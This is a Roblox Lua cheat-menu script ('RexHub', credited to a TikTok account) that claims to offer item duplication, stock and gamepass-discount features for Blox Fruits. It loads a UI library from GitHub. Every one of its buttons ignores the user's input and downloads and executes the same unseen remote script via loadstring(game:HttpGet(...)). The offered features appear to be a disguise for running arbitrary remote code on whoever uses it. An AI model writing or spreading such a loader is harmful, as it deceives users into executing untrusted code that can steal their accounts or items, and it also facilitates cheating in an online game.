-- Garantir que a OrionLib está carregada
local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()

-- Criar a janela do menu com o nome personalizado
local Window = OrionLib:MakeWindow({Name = "RexHub", HidePremium = true, IntroText = "Welcome"})

-- Função para executar o script remoto
local function executeScript()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/wogjiew55/GamepassDiscount/refs/heads/main/BloxFruits', true))()
end

-- Options [OP] Tab
local OptionsTab = Window:MakeTab({
    Name = "Options [OP]",
    Icon = "rbxassetid://4483345998", -- Ícone padrão
    PremiumOnly = false
})

OptionsTab:AddTextbox({
    Name = "Enter Dupe Number",
    Default = "",
    TextDisappear = true,
    Callback = function(Value)
        print("Dupe Number: "..Value)
    end
})

OptionsTab:AddButton({
    Name = "Start Dupe",
    Callback = function()
        executeScript()  -- Executa o script remoto ao clicar
    end
})

OptionsTab:AddButton({
    Name = "All in Stock",
    Callback = function()
        executeScript()  -- Executa o script remoto ao clicar
    end
})

OptionsTab:AddButton({
    Name = "Apply Discount [Gamepass]",
    Callback = function()
        executeScript()  -- Executa o script remoto ao clicar
    end
})

-- Credits Tab
local CreditsTab = Window:MakeTab({
    Name = "Credits",
    Icon = "rbxassetid://4483345998", -- Ícone padrão
    PremiumOnly = false
})

-- Adicionando os textos na aba de créditos
CreditsTab:AddParagraph("Credits", "RexScripts")
CreditsTab:AddParagraph("Tiktok", "@rex.scripts")

-- Inicializa a UI
OrionLib:Init()
